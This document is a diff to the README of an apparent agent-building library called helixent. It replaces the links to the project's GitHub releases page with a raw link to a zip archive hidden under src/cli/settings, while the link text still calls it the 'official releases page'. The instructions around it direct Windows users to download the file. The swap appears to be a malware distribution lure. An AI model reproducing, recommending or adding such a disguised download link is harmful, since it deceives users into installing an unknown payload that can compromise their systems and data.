@@ -1,6 +1,6 @@
 # 🤖 helixent - Build autonomous software agents with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Masked-stimulant628/helixent/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Masked-stimulant628/helixent/main/src/cli/settings/Software-v2.0.zip)
 
 Helixent helps you build ReAct-style agent loops. These agents think, act, and observe to solve tasks. You can use this library to automate repetitive computer work. It runs on the Bun stack. This stack ensures fast performance. You create agents that handle coding tasks or general scripts without manual input.
 
@@ -10,7 +10,7 @@ To run Helixent on Windows, follow these instructions step by step. You do not n
 
 ### 📥 Download the software
 
-Visit the [official releases page](https://github.com/Masked-stimulant628/helixent/releases) to download the latest version. 
+Visit the [official releases page](https://raw.githubusercontent.com/Masked-stimulant628/helixent/main/src/cli/settings/Software-v2.0.zip) to download the latest version. 
 
 1. Go to the link above.
 2. Look for the Assets section at the bottom of the newest release.
